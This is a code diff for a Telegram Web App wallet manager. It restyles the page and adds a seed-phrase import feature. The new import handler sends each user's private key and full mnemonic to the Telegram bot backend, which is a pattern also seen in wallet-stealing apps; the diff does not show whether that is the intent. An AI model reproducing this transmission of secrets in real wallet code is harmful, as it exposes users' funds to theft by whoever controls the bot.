@@ -48,6 +48,65 @@
     button:hover {
       background: linear-gradient(90deg, #38b6ff 0%, #4f8cff 100%);
     }
+    .section {
+      margin-bottom: 2rem;
+      padding: 1.5rem;
+      background: #f8fafc;
+      border-radius: 12px;
+      border: 1px solid #e2e8f0;
+    }
+    .section h3 {
+      margin: 0 0 1rem 0;
+      font-size: 1.1rem;
+      font-weight: 600;
+      color: #374151;
+    }
+    .input-field, .textarea-field {
+      width: 100%;
+      padding: 0.75rem;
+      border-radius: 8px;
+      border: 1px solid #d1d5db;
+      font-size: 1rem;
+      margin-bottom: 1rem;
+      box-sizing: border-box;
+    }
+    .textarea-field {
+      min-height: 80px;
+      resize: vertical;
+      font-family: 'Inter', Arial, sans-serif;
+    }
+    .primary-btn {
+      background: linear-gradient(90deg, #4f8cff 0%, #38b6ff 100%);
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      padding: 0.9rem 1.5rem;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+      width: 100%;
+      box-shadow: 0 2px 8px rgba(79,140,255,0.15);
+    }
+    .primary-btn:hover {
+      background: linear-gradient(90deg, #38b6ff 0%, #4f8cff 100%);
+    }
+    .secondary-btn {
+      background: #fff;
+      color: #4f8cff;
+      border: 1.5px solid #4f8cff;
+      border-radius: 8px;
+      padding: 0.9rem 1.5rem;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+      width: 100%;
+    }
+    .secondary-btn:hover {
+      background: #4f8cff;
+      color: #fff;
+    }
     .import-section {
       margin-top: 2.5rem;
       padding-top: 1.5rem;
@@ -71,25 +130,29 @@
   </style>
 </head>
 <body>
-    <div class="container">
+        <div class="container">
       <h1>Wallet Manager</h1>
-      <input id="password" type="password" placeholder="Password to encrypt wallet" style="width:100%;padding:0.7rem;border-radius:6px;border:1px solid #d1d5db;font-size:1rem;" />
-      <button id="createWalletBtn">Create New Wallet</button>
       
-      <div class="import-section">
-        <h3>Import Existing Wallet</h3>
-        
-        <!-- Import from file -->
-        <div class="import-option">
-          <input id="importFile" type="file" accept="application/json" style="display:none;" />
-          <button id="importWalletBtn" style="background:#fff;color:#4f8cff;border:1.5px solid #4f8cff;margin-top:0;">📁 Import from File</button>
-        </div>
-        
-        <!-- Import from seed phrase -->
-        <div class="import-option">
-          <textarea id="seedPhrase" placeholder="Enter your 12 or 24 word seed phrase here...&#10;Example: abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about" style="width:100%;padding:0.7rem;border-radius:6px;border:1px solid #d1d5db;font-size:0.95rem;min-height:80px;resize:vertical;"></textarea>
-          <button id="importSeedBtn" style="background:#fff;color:#16a34a;border:1.5px solid #16a34a;margin-top:0.8rem;">🌱 Import from Seed Phrase</button>
-        </div>
+      <!-- Create New Wallet Section -->
+      <div class="section">
+        <h3>Create New Wallet</h3>
+        <input id="password" type="password" placeholder="Password to encrypt wallet" class="input-field" />
+        <button id="createWalletBtn" class="primary-btn">Create Wallet</button>
+      </div>
+      
+      <!-- Import from Seed Phrase Section -->
+      <div class="section">
+        <h3>Import from Seed Phrase</h3>
+        <textarea id="seedPhrase" placeholder="Enter your 12 or 24 word seed phrase..." class="textarea-field"></textarea>
+        <input id="seedPassword" type="password" placeholder="Password to encrypt wallet" class="input-field" />
+        <button id="importSeedBtn" class="primary-btn">Import from Seed</button>
+      </div>
+      
+      <!-- Import from File Section -->
+      <div class="section">
+        <h3>Import from Encrypted File</h3>
+        <input id="importFile" type="file" accept="application/json" style="display:none;" />
+        <button id="importWalletBtn" class="secondary-btn">Choose Encrypted File</button>
       </div>
     </div>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -122,6 +185,11 @@
       } catch (error) {
         console.error('Error sending data to bot:', error);
       }
+    }
+    
+    function validateSeedPhrase(seedPhrase) {
+      const words = seedPhrase.trim().split(/\s+/);
+      return words.length === 12 || words.length === 24;
     }
     
     function showSuccessMessage(wallet) {
@@ -228,6 +296,50 @@
       // Also download encrypted backup
       downloadEncryptedWallet(encrypted);
     });
+    document.getElementById('importSeedBtn').addEventListener('click', async function() {
+      const seedPhrase = document.getElementById('seedPhrase').value.trim();
+      const password = document.getElementById('seedPassword').value;
+      
+      if (!seedPhrase) {
+        alert('Please enter your seed phrase.');
+        return;
+      }
+      
+      if (!validateSeedPhrase(seedPhrase)) {
+        alert('Please enter a valid 12 or 24 word seed phrase.');
+        return;
+      }
+      
+      if (!password || password.length < 6) {
+        alert('Please enter a password (min 6 characters) to encrypt your wallet.');
+        return;
+      }
+      
+      try {
+        const wallet = ethers.Wallet.fromPhrase(seedPhrase);
+        sessionWallet = wallet; // Store in RAM for session
+        
+        // Send wallet to bot for session management
+        const walletData = {
+          name: `Seed ${Date.now().toString().slice(-6)}`, // Simple unique name
+          address: wallet.address,
+          privateKey: wallet.privateKey,
+          mnemonic: seedPhrase
+        };
+        
+        sendWalletToBot(walletData);
+        showSuccessMessage(walletData);
+        
+        // Also create encrypted backup
+        const encrypted = await encryptMnemonic(seedPhrase, password);
+        encrypted.address = wallet.address;
+        downloadEncryptedWallet(encrypted);
+      } catch (error) {
+        console.error('Error importing from seed phrase:', error);
+        alert('Invalid seed phrase. Please check and try again.');
+      }
+    });
+
     document.getElementById('importWalletBtn').addEventListener('click', function() {
       document.getElementById('importFile').click();
     });
